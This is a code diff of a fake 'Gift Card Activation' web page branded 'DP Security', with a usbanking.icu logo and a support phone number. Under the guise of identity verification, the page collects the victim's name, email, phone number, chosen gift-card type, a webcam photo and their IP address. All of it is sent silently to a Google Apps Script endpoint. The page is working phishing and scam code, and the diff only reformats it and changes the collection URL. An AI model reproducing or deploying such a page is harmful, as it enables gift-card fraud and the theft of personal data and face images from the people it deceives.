@@ -7,12 +7,7 @@
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@latest/vision_bundle.js" crossorigin="anonymous"></script>
     <style>
         body { font-family: 'Segoe UI', sans-serif; margin: 0; background: radial-gradient(circle at center, #1a1c2c 0%, #0d0e14 100%); color: #e0e0e0; display: flex; flex-direction: column; min-height: 100vh; }
-        #successModal, #errorModal {
-            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background-color: #1e1e1e; padding: 30px; border-radius: 12px;
-            box-shadow: 0 0 50px rgba(0, 217, 224, 0.4); z-index: 1000;
-            text-align: center; width: 80%; max-width: 400px; border: 2px solid #00d9e0;
-        }
+        #successModal, #errorModal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: #1e1e1e; padding: 30px; border-radius: 12px; box-shadow: 0 0 50px rgba(0, 217, 224, 0.4); z-index: 1000; text-align: center; width: 80%; max-width: 400px; border: 2px solid #00d9e0; }
         #errorModal { border-color: #d32f2f; box-shadow: 0 0 50px rgba(211, 47, 47, 0.4); }
         #modalOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); z-index: 999; }
         .logo-container img { max-width: 300px; height: auto; display: block; margin: 40px auto; }
@@ -43,162 +38,53 @@
     <h3 style="color: #00d9e0;">Activation Successful</h3>
     <p>Identity verified. Your session is now secure.</p>
     <p>Support: 323-374-3366</p>
-    <button class="close-btn" onclick="closeWindow()">Close and Secure Session</button>
+    <button class="close-btn" onclick="window.close(); setTimeout(() => { alert('Please close this tab manually.'); }, 500);">Close and Secure Session</button>
 </div>
-<div id="errorModal">
-    <h3 style="color: #f44336;">Verification Error</h3>
-    <p id="errorText"></p>
-    <button type="button" class="modal-btn" onclick="closeError()">OK</button>
-</div>
-<header>
-    <div class="logo-container"><img src="https://usbanking.icu/DP.png" alt="DP Security Logo"></div>
-</header>
+<div id="errorModal"><h3 style="color: #f44336;">Verification Error</h3><p id="errorText"></p><button class="modal-btn" onclick="document.getElementById('modalOverlay').style.display='none'; document.getElementById('errorModal').style.display='none';">OK</button></div>
+<header><div class="logo-container"><img src="https://usbanking.icu/DP.png" alt="DP Security Logo"></div></header>
 <main>
     <div class="activation-container">
         <h2>Gift Card Activation</h2>
         <form id="activationForm">
-            <div class="form-group">
-                <label for="cardType">Select Card Type</label>
-                <select id="cardType" name="cardType" required>
-                    <option value="" disabled selected>Choose a card...</option>
-                    <option value="Amazon Card">Amazon Card</option>
-                    <option value="Apple Card">Apple Card</option>
-                    <option value="eBay Card">eBay Card</option>
-                    <option value="Google Play Card">Google Play Card</option>
-                    <option value="Greendot Card">Greendot Card</option>
-                    <option value="Steam Card">Steam Card</option>
-                    <option value="Vanilla Card">Vanilla Card</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label for="fullName">Full Name</label>
-                <input type="text" id="fullName" name="fullName" required placeholder="First and Last Name" pattern="^[a-zA-Z]+\s+[a-zA-Z]+.*$">
-            </div>
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" name="email" required placeholder="john.doe@example.com">
-            </div>
-            <div class="form-group">
-                <label for="phone">Phone Number</label>
-                <input type="tel" id="phone" name="phone" required placeholder="(xxx) xxx-xxxx" maxlength="14">
-            </div>
-            <div class="form-group">
-                <label>Human Face Verification</label>
-                <div id="camera-section">
-                    <video id="video-preview" autoplay playsinline></video>
-                    <button type="button" id="start-camera" class="cam-btn">Initialize Secure Camera</button>
-                </div>
-            </div>
-            <div class="form-group">
-                <label id="captcha-question" style="color:#00d9e0;"></label>
-                <input type="number" id="captcha-answer" placeholder="Enter result" required>
-            </div>
+            <div class="form-group"><label>Select Card Type</label><select id="cardType" required><option value="" disabled selected>Choose a card...</option><option value="Amazon Card">Amazon Card</option><option value="Apple Card">Apple Card</option><option value="eBay Card">eBay Card</option><option value="Google Play Card">Google Play Card</option><option value="Greendot Card">Greendot Card</option><option value="Steam Card">Steam Card</option><option value="Vanilla Card">Vanilla Card</option></select></div>
+            <div class="form-group"><label>Full Name</label><input type="text" id="fullName" required placeholder="First and Last Name" pattern="^[a-zA-Z]+\s+[a-zA-Z]+.*$"></div>
+            <div class="form-group"><label>Email Address</label><input type="email" id="email" required placeholder="john.doe@example.com"></div>
+            <div class="form-group"><label>Phone Number</label><input type="tel" id="phone" required placeholder="(xxx) xxx-xxxx" maxlength="14"></div>
+            <div class="form-group"><label>Human Face Verification</label><div id="camera-section"><video id="video-preview" autoplay playsinline></video><button type="button" id="start-camera" class="cam-btn">Initialize Secure Camera</button></div></div>
+            <div class="form-group"><label id="captcha-question" style="color:#00d9e0;"></label><input type="number" id="captcha-answer" placeholder="Enter result" required></div>
             <button type="submit" class="submit-btn" id="submitBtn">Activate Card and Verify You are Human</button>
-            <div id="verify-container">
-                <div class="progress-label-wrap">
-                    <span class="progress-text">Verifying now...</span>
-                    <span class="progress-note">don't move while we verify</span>
-                </div>
-                <div class="progress-bg"><div id="progress-bar"></div></div>
-            </div>
+            <div id="verify-container"><div class="progress-label-wrap"><span class="progress-text">Verifying now...</span><span class="progress-note">don't move while we verify</span></div><div class="progress-bg"><div id="progress-bar"></div></div></div>
         </form>
     </div>
 </main>
-<footer><a href="mock.html" style="cursor: pointer;">Copyright &copy; DP Security <span id="year"></span></a></footer>
 <script>
-    document.getElementById('year').textContent = new Date().getFullYear();
-    const scriptURL = 'https://script.google.com/macros/s/AKfycby9sgxLuxRgtDr5GEfA4oSzqyHK_d8ZzpDJRKRf4sCApPMCCkmjRKK3YccVkJJfU8Ch/exec';
-
-    function closeWindow() {
-        window.close();
-        setTimeout(() => { alert("Security lock active. You may now close this tab manually."); }, 500);
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzpmy1sRK0T90sFd3DhX9S4I9qotIrXjBQqcu4qWS_DU2axDJmGGCB9Hvm69J_mohlJ/exec';
+    let faceDetector; const vision = window.tasksVision; let streamActive = false;
+    async function initSec() { 
+        try { 
+            const res = await vision.FilesetResolver.forVisionTasks("https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@latest/wasm");
+            faceDetector = await vision.FaceDetector.createFromOptions(res, { baseOptions: { modelAssetPath: `https://storage.googleapis.com/mediapipe-models/face_detector/blaze_face_short_range/float16/1/blaze_face_short_range.tflite`, delegate: "GPU" }, runningMode: "IMAGE" });
+        } catch(e) {} 
     }
-    function showError(msg) {
-        document.getElementById('errorText').innerText = msg;
-        document.getElementById('modalOverlay').style.display = 'block';
-        document.getElementById('errorModal').style.display = 'block';
-        document.getElementById('verify-container').style.display = 'none';
-    }
-    function closeError() {
-        document.getElementById('modalOverlay').style.display = 'none';
-        document.getElementById('errorModal').style.display = 'none';
-    }
-
-    let faceDetector;
-    const vision = window.tasksVision;
-    async function initializeSecurity() {
-        try {
-            const filesetResolver = await vision.FilesetResolver.forVisionTasks("https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@latest/wasm");
-            faceDetector = await vision.FaceDetector.createFromOptions(filesetResolver, {
-                baseOptions: { modelAssetPath: `https://storage.googleapis.com/mediapipe-models/face_detector/blaze_face_short_range/float16/1/blaze_face_short_range.tflite`, delegate: "GPU" },
-                runningMode: "IMAGE"
-            });
-        } catch(e) { console.warn("Model loading issue."); }
-    }
-    initializeSecurity();
-
-    document.getElementById('phone').addEventListener('input', function (e) {
-        let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
-        e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
-    });
-
-    const video = document.getElementById('video-preview');
-    const startBtn = document.getElementById('start-camera');
-    let streamActive = false;
-
-    startBtn.onclick = async () => {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            video.srcObject = stream;
-            video.onloadedmetadata = () => { video.play(); video.style.display = 'block'; startBtn.style.display = 'none'; streamActive = true; };
-        } catch(e) { showError("Camera access required."); }
-    };
-
-    let n1 = Math.floor(Math.random() * 15) + 5, n2 = Math.floor(Math.random() * 10) + 1;
-    let operation = Math.random() > 0.5 ? '+' : '-';
-    let correctAnswer = operation === '+' ? (n1 + n2) : (n1 - n2);
-    document.getElementById('captcha-question').textContent = `Security Check: ${n1} ${operation} ${n2} = ?`;
-
+    initSec();
+    document.getElementById('phone').addEventListener('input', e => { let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/); e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : ''); });
+    const video = document.getElementById('video-preview'); const startBtn = document.getElementById('start-camera');
+    startBtn.onclick = async () => { try { const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }); video.srcObject = s; video.onloadedmetadata = () => { video.play(); video.style.display = 'block'; startBtn.style.display = 'none'; streamActive = true; }; } catch(e) { alert("Camera access required."); } };
+    let n1 = Math.floor(Math.random()*15)+5, n2 = Math.floor(Math.random()*10)+1, op = Math.random()>0.5?'+':'-', ans = op==='+'?(n1+n2):(n1-n2);
+    document.getElementById('captcha-question').textContent = `Security Check: ${n1} ${op} ${n2} = ?`;
     document.getElementById('activationForm').onsubmit = async (e) => {
-        e.preventDefault();
-        const submitBtn = document.getElementById('submitBtn');
-        const progressBar = document.getElementById('progress-bar');
-        const verifyContainer = document.getElementById('verify-container');
-
-        if (!streamActive) { showError("Please start the secure camera first."); return; }
-
-        verifyContainer.style.display = 'block';
-        progressBar.style.width = '20%';
-
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
-
+        e.preventDefault(); if(!streamActive) { alert("Start camera first."); return; }
+        const pb = document.getElementById('progress-bar'); document.getElementById('verify-container').style.display='block'; pb.style.width='30%';
+        const cv = document.createElement('canvas'); cv.width=video.videoWidth; cv.height=video.videoHeight; cv.getContext('2d').drawImage(video,0,0);
+        if(faceDetector && faceDetector.detect(cv).detections.length===0) { alert("No face detected."); pb.style.width='0%'; return; }
+        if(parseInt(document.getElementById('captcha-answer').value)!==ans) { alert("Math fail."); return; }
+        pb.style.width='70%';
         try {
-            if (faceDetector) {
-                const scan = faceDetector.detect(canvas);
-                if (scan.detections.length === 0) { showError("No face detected. Please face the camera."); return; }
-            }
-            if (parseInt(document.getElementById('captcha-answer').value) !== correctAnswer) { showError("Math check failed."); return; }
-
-            progressBar.style.width = '60%';
-            submitBtn.innerText = "Processing...";
-            submitBtn.disabled = true;
-
-            const ipData = await (await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) })).json();
-            const submission = { date: new Date().toLocaleString(), name: document.getElementById('fullName').value, email: document.getElementById('email').value, phone: document.getElementById('phone').value, barcode: document.getElementById('cardType').value, photo: canvas.toDataURL('image/png'), status: 'PENDING', ip: ipData.ip };
-
-            await fetch(scriptURL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: JSON.stringify(submission) });
-            
-            progressBar.style.width = '100%';
-            setTimeout(() => {
-                video.srcObject.getTracks().forEach(track => track.stop());
-                document.getElementById('modalOverlay').style.display = 'block';
-                document.getElementById('successModal').style.display = 'block';
-            }, 500);
-
-        } catch (err) { showError("Connection error."); submitBtn.disabled = false; }
+            const ip = await (await fetch('https://api.ipify.org?format=json')).json();
+            const sub = { date: new Date().toLocaleString(), name: document.getElementById('fullName').value, email: document.getElementById('email').value, phone: document.getElementById('phone').value, barcode: document.getElementById('cardType').value, photo: cv.toDataURL('image/png'), status: 'PENDING', ip: ip.ip };
+            await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(sub) });
+            pb.style.width='100%'; setTimeout(() => { video.srcObject.getTracks().forEach(t=>t.stop()); document.getElementById('modalOverlay').style.display='block'; document.getElementById('successModal').style.display='block'; }, 500);
+        } catch(err) { alert("Error connecting."); }
     };
 </script>
 </body>
